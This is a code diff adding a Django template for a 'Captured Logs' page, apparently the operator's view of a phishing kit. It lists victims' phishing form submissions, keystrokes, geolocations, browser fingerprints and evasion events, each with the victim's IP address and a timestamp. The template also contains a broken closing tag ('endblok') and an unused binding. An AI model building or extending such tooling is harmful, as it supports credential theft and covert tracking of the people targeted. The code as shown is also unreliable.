@@ -1,0 +1,39 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block content %}
+    <div>
+        <h1>Captured Logs</h1>
+        <h2>Phishing Submissions</h2>
+        <ul>{% for log in phishing %}<li>{{ log.page }} - {{ log.data }} ({{ log.ip }}) @ {{ log.timestamp }}</li>{% endfor %}</ul>
+        <h2>Keystrokes</h2>
+        <ul>{% for log in keystrokes %}<li>{{ log.page }} - {{ log.keys }} ({{ log.ip }}) @ {{ log.timestamp }}</li>{% endfor %}</ul>
+        <h2>Geolocations</h2>
+        <ul>{% for geo in geos %}<li>{{ geo.lat }}, {{ geo.lon }} ({{ geo.ip }}) @ {{ geo.timestamp }}</li>{% endfor %}</ul>
+        <h2>Fingerprints</h2>
+        <ul>
+        {% for fp in fingerprints %}
+            {% with data=fp.fingerprint|safe|json_script:"fpdata" %}
+            <li>
+              <strong>IP:</strong> {{ fp.ip }} @ {{ fp.timestamp }}<br>
+              {% with fpdata=fp.fingerprint|json_loads %}
+                <ul>
+                    <li><strong>User Agent:</strong> {{ fpdata.userAgent|default:"N/A" }}</li>
+                    <li><strong>Language:</strong> {{ fpdata.language|default:"N/A" }}</li>
+                    <li><strong>Platform:</strong> {{ fpdata.platform|default:"N/A" }}</li>
+                    <li><strong>Screen:</strong> {{ fpdata.screen|default:"N/A" }}</li>
+                    <li><strong>Timezone:</strong> {{ fpdata.timezone|default:"N/A" }}</li>
+                    <li><strong>Plugins:</strong> {{ fpdata.plugins|default:"N/A" }}</li>
+                </ul>
+              {% endwith %}
+              <details><summary>Raw</summary><pre>{{ fp.fingerprint }}</pre></details>
+            </li>
+            {% endwith %}
+        {% endfor %}
+        </ul>
+        
+        <h2>Evasion Events</h2>
+        <ul>{% for evasion in evasions %}<li>{{ evasion.info }} ({{ evasion.ip }}) @ {{ evasion.timestamp }}</li>{% endfor %}</ul>
+    </div>
+{% endblok %}
